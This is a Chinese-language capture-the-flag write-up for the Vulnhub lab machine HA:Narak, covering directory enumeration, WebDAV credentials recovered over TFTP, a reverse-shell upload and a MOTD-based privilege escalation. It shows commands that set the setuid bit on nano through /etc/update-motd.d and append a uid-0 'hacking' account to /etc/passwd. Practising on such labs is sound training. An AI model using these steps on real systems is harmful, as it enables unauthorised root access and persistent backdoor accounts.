---
layout: post
title: "Vulnhub HA:Narak Writeup"
tags: [Vulnhub, Pentest]
comments: true
---

## 前言

* Pentester

> Author: xxxeyJ   
> Blog: https://tricksongs.com/

* 靶机信息 (Target Information)

> Lab Name: HA:Narak   
> Date Release: 23 Sep 2020   
> Author: Hacking Articles   
> Series: HA   

* 文件信息 (File Information)

> Filename: narak.ova   
> File Size: 791 MB   
* Checksum   
> MD5: C058F595C60923998659C630CEA576E6   
> SHA1: 1340392A00BE6098CD0AEAFA26D2550FC4F2A459

* Download Link: https://www.vulnhub.com/entry/ha-narak,569/

## RECON

> Target IP Address: 192.168.0.103

首先使用 Nmap 扫一下端口;

![](https://tricksongs.com/images/HA_Narak/Ports.PNG)

看一下 80 端口，艺术气氛 MAX;

![](https://tricksongs.com/images/HA_Narak/Index.PNG)

> CTRL + U 看一下前端源码，发现引用了 images 目录下的图片文件，随手改一下路径，发现有个目录遍历的问题;

![](https://tricksongs.com/images/HA_Narak/SourceCode.PNG)

![](https://tricksongs.com/images/HA_Narak/ImagesIndex.PNG)

## ENUMERATION

跑一下字典看看有没有什么东西;

```Shell
xxxeyJ@localhost:~/Tools/ffuf$ ./ffuf -c -u http://192.168.0.103/FUZZ -w dict.txt 

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.1.0
________________________________________________

 :: Method           : GET
 :: URL              : http://192.168.0.103/FUZZ
 :: Wordlist         : FUZZ: dict.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403
________________________________________________

                        [Status: 200, Size: 2992, Words: 356, Lines: 68]
.hta                    [Status: 403, Size: 278, Words: 20, Lines: 10]
.htaccess               [Status: 403, Size: 278, Words: 20, Lines: 10]
.htaccess~              [Status: 403, Size: 278, Words: 20, Lines: 10]
.htaccess/              [Status: 403, Size: 278, Words: 20, Lines: 10]
.htaccess.bak           [Status: 403, Size: 278, Words: 20, Lines: 10]
.htaccess.bak1          [Status: 403, Size: 278, Words: 20, Lines: 10]
.htaccessbak            [Status: 403, Size: 278, Words: 20, Lines: 10]
.htaccessBAK            [Status: 403, Size: 278, Words: 20, Lines: 10]
.htaccess.inc           [Status: 403, Size: 278, Words: 20, Lines: 10]
.htaccess-dev           [Status: 403, Size: 278, Words: 20, Lines: 10]
.htaccess_extra         [Status: 403, Size: 278, Words: 20, Lines: 10]
.htaccessold            [Status: 403, Size: 278, Words: 20, Lines: 10]
.htaccess.BAK           [Status: 403, Size: 278, Words: 20, Lines: 10]
.htaccess-marco         [Status: 403, Size: 278, Words: 20, Lines: 10]
.htaccessOLD            [Status: 403, Size: 278, Words: 20, Lines: 10]
.htaccessOLD2           [Status: 403, Size: 278, Words: 20, Lines: 10]
.htaccess_orig          [Status: 403, Size: 278, Words: 20, Lines: 10]
.htaccess-local         [Status: 403, Size: 278, Words: 20, Lines: 10]
.htaccess.orig          [Status: 403, Size: 278, Words: 20, Lines: 10]
.htaccessold2           [Status: 403, Size: 278, Words: 20, Lines: 10]
.htaccess.save          [Status: 403, Size: 278, Words: 20, Lines: 10]
.htaccess.txt           [Status: 403, Size: 278, Words: 20, Lines: 10]
.htaccess_sc            [Status: 403, Size: 278, Words: 20, Lines: 10]
.htaccess.sample        [Status: 403, Size: 278, Words: 20, Lines: 10]
.htgroup                [Status: 403, Size: 278, Words: 20, Lines: 10]
.html                   [Status: 403, Size: 278, Words: 20, Lines: 10]
.htpasswd               [Status: 403, Size: 278, Words: 20, Lines: 10]
.htpasswd.bak           [Status: 403, Size: 278, Words: 20, Lines: 10]
.htpasswd/              [Status: 403, Size: 278, Words: 20, Lines: 10]
.htpasswd.inc           [Status: 403, Size: 278, Words: 20, Lines: 10]
.htpasswds              [Status: 403, Size: 278, Words: 20, Lines: 10]
.htpasswrd              [Status: 403, Size: 278, Words: 20, Lines: 10]
.htpasswd_test          [Status: 403, Size: 278, Words: 20, Lines: 10]
.htpasswd-old           [Status: 403, Size: 278, Words: 20, Lines: 10]
.ht_wsr.txt             [Status: 403, Size: 278, Words: 20, Lines: 10]
.htusers                [Status: 403, Size: 278, Words: 20, Lines: 10]
icons/                  [Status: 403, Size: 278, Words: 20, Lines: 10]
icons/small/            [Status: 403, Size: 278, Words: 20, Lines: 10]
images                  [Status: 301, Size: 315, Words: 20, Lines: 10]
images/                 [Status: 200, Size: 4566, Words: 239, Lines: 36]
index.html              [Status: 200, Size: 2992, Words: 356, Lines: 68]
index.phps              [Status: 403, Size: 278, Words: 20, Lines: 10]
.htaccess.old           [Status: 403, Size: 278, Words: 20, Lines: 10]
server-status/          [Status: 403, Size: 278, Words: 20, Lines: 10]
server-status           [Status: 403, Size: 278, Words: 20, Lines: 10]
style.css               [Status: 200, Size: 23358, Words: 211, Lines: 232]
tips.txt                [Status: 200, Size: 58, Words: 12, Lines: 2]
webdav                  [Status: 401, Size: 460, Words: 42, Lines: 15]
webdav/index.html       [Status: 401, Size: 460, Words: 42, Lines: 15]
webdav/servlet/webdav/  [Status: 401, Size: 460, Words: 42, Lines: 15]
webdav/                 [Status: 401, Size: 460, Words: 42, Lines: 15]
webdav/site/codul/users/cborgea3 [Status: 401, Size: 460, Words: 42, Lines: 15]
:: Progress: [76198/76198] :: Job [1/1] :: 12699 req/sec :: Duration: [0:00:06] :: Errors: 1 ::
```

icons 目录返回的状态码是 403，说明只有 images 目录配置不当，webdav 及其他几个子目录返回的状态码都是 401，访问一下发现 webdav 目录启用了基础认证(Basic Auth)，跑了一会字典无果;

![](https://tricksongs.com/images/HA_Narak/webdav_401.PNG)

查看一下 tips.txt 文件内容，提示可以在 creds.txt 中找到线索，把文件拼接在了 URL 后面，发现并不存在此文件;

![](https://tricksongs.com/images/HA_Narak/tips.PNG)

![](https://tricksongs.com/images/HA_Narak/NF.PNG)

80 端口到了这线索差不多就断了，然后看一下之前扫到的其他端口;

先看一下 tftp 服务，发现可以连接并获取到相关文件，很明显是 base64 编码后的内容，解码一下 get 到 WEBDAV 凭据;

![](https://tricksongs.com/images/HA_Narak/tftp.PNG)

> Username: yamdoot
> Password: Swarg

## EXPLOITATION

使用 **cadaver** 上传一个 Shell，访问一下即可将 Shell Session 反弹至指定的 IP:PORT;

![](https://tricksongs.com/images/HA_Narak/cadaver.PNG)

使用 Python 将哑 Shell 提升到可交互 Shell;

```Python
python3 -c 'import pty;pty.spawn("/bin/bash")'
```

![](https://tricksongs.com/images/HA_Narak/REVERSE.PNG)

翻找系统中各类文件，发现 **/mnt/hell.sh** 的内容比较奇怪;

```Shell
#!/bin/bash
echo"Highway to Hell";
--[----->+<]>---.+++++.+.+++++++++++.--.+++[->+++<]>++.++++++.--[--->+<]>--.-----.++++.
```

> **Brainfuck** 解码后结果为: **chitragupt**，感觉是凭据，但不是一组，所以应该是某种密码;

![](https://tricksongs.com/images/HA_Narak/brainfuck.PNG)

尝试使用此密码登录 root 账户失败了;

![](https://tricksongs.com/images/HA_Narak/ROOT.PNG)

查看一下 passwd 用户表，发现除了常见的 Ubuntu 自有用户还多了几个以前没有见过的用户;

![](https://tricksongs.com/images/HA_Narak/inferno.PNG)

> 成功登入 inferno 账户，发现权限比 www-data 还小，好在 Get 到了 flag.txt;

![](https://tricksongs.com/images/HA_Narak/flag.PNG)

## PRIVILEGE ESCALATION

> 利用 **MOTD** 将权限提升为 root 用户;

```Shell
ssh inferno@192.168.0.103
which nano
ls -la /bin/nano
echo "sudo chmod u+s /bin/nano" >> /etc/update-motd.d/00-header
exit
```

使用 OpenSSL 生成 passwd 表中的 hash;

![](https://tricksongs.com/images/HA_Narak/openssl.PNG)

```Shell
ssh inferno@192.168.0.103
nano /etc/passwd
```

> 将 "hacking:$1$1337$EIeG0N38xUkEIB4U8P6fv/:0:0:root:/root:/bin/bash" 追加到 passwd 文件末尾;

```Shell
su hacking
cd ~
tail /etc/passwd
cat root.txt
```

![](https://tricksongs.com/images/HA_Narak/ROOTFLAG.PNG)

**Successfully got the flag!**

### **:)**
